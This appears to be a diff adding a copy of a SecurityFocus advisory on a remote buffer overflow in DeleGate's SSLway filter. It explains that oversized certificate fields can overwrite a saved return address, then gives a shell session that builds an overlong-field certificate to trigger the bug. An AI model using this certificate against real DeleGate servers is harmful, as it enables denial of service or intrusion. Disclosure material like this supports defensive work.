@@ -1,0 +1,26 @@
+source: http://www.securityfocus.com/bid/10295/info
+
+A remote buffer overflow vulnerability has been reported to affect the DeleGate SSLway filter. This filter is employed when DeleGate is applying SSL to arbitrary protocols.
+
+The issue presents itself due to a lack of sufficient boundary checks performed, when copying user-supplied certificate field contents.
+
+A remote attacker may potentially exploit this issue, to overwrite the return address of the static ssl_prcert() function. The attacker may corrupt any other saved value that is within 768 bytes from the end of the affected buffers.
+
+It has been reported that the X509_NAME_oneline() function will perform character conversion on characters below '0x20' or above '0x7e'; this may hinder exploitation of this issue.
+
+[je@vudo ~]$ cat>openssl.cnf<<EOF
+> [ req ]
+> distinguished_name = req_dn
+> prompt = no
+> [ req_dn ]
+> CN=bof
+> 0.OU=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+> 1.OU=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+> 2.OU=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+> 3.OU=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+EOF
+[je@vudo ~]$ openssl req -x509 -new -nodes -out bof.pem -keyout bof.pem -config openssl.cnf
+Generating a 512 bit RSA private key
+.........++++++++++++
+..........++++++++++++
+writing new private key to 'bof.pem'
